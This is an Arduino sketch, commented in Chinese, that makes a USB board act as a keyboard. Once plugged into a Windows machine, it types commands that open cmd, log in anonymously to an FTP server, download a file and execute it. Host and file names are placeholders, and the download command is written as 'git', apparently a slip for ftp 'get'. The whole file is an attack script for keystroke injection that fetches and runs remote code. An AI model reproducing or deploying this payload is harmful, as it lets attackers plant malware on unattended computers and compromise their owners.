#include <Keyboard.h>

void setup() {
  Keyboard.begin();//开始键盘通信
  
  delay(10000);//延时（等待系统安装键盘驱动）
  
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键（防止输入中文符号）
  
  Keyboard.press(KEY_LEFT_GUI);//按下win键 
  Keyboard.press('r');//按下r键 
  Keyboard.release(KEY_LEFT_GUI);//释放win键 
  Keyboard.release('r');//释放r键 （打开“运行”窗口）
  
  Keyboard.println("cmd");//输入cmd
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键（打开命令行）
  
  Keyboard.println("ftp 'ip/域名' ");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);//连接到ftp服务器
  
  delay(5000);//等待连接
  
  Keyboard.println("anonymous");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);//匿名登陆
  
  Keyboard.println("git xxx.xxx ");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);//下载文件
  
  delay(30000);//等待下载完成
  
  Keyboard.println("xxx.xxx ");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);//执行
  
  Keyboard.press(KEY_CAPS_LOCK); //
  Keyboard.release(KEY_CAPS_LOCK); //关闭大写锁定
  
  Keyboard.end();//结束键盘通信

}


void loop(){}
